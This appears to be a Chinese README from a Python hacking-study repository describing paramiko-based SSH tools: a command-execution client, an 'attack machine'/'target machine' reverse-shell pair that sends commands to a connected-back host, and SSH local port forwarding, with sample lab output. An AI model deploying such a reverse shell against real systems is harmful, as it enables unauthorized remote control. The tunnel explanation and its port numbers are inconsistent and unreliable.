# SSH通信
`pip install paramiko`

`paramiko`基于`pycrypto`开发的第三方库


# ssh_cmd.py ssh命令执行client
## 流程
- `paramiko`编写SSH client
- 连接SSH，执行命令

## Example:
```
Username:ssff
Password: 
Entry server ip:192.168.199.129
Enter port:22
Entry command:whoami
----OUTPUT----
root
```

# ssh 类反弹shell程序
## 攻击机
`ssh_server.py`启动ssh服务，等待靶机连接，向靶机发送命令执行
### Example:
```
┌──(root💀ssff)-[~/python_hacker_study/python_ssh]
└─# python3 ssh_server.py 
[+] Listening for connection ...
[+] Authenticated!
b'ClientConnected'
Enter command:ls
README.md
ssh_cmd.py
ssh_rcmd.py
ssh_server.py
test_rsa.key

Enter command:

```

## 靶机
`ssh_rcmd.py`连接攻击机ssh服务，接收攻击机命令
### Example:
```
(venv) python_ssh ➤ python3 ssh_rcmd.py                                                                       git:main*
Username:ssr
Password:
Entry server ip:192.168.199.129
Enter port:2222
Welcome to ssh
```
## KEY
`test_rsa.key` 官方github的示例文件

# SSH隧道命令使用
**机器A**

执行`ssh -L 8081:192.168.199.1:8080 ssr@192.168.199.129`

**机器B**

ssh转发机器

`ip: 192.168.199.129`


**机器C**

`ip: 192.168.199.1`
在本机`0.0.0.0:8080`启web服务


## 说明
机器A将机器B的8080端口映射到了本地的8081端口，当机器A访问本地的8081端口时，实际上是以机器C的身份，对机器B的8080端口进行访问。

## Example:
```
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
192.168.199.129 - - [08/Aug/2022 11:18:15] "GET / HTTP/1.1" 200 -
192.168.199.129 - - [08/Aug/2022 11:18:25] "GET / HTTP/1.1" 200 -

```



> 参考 https://github.com/paramiko/paramiko/blob/main/demos/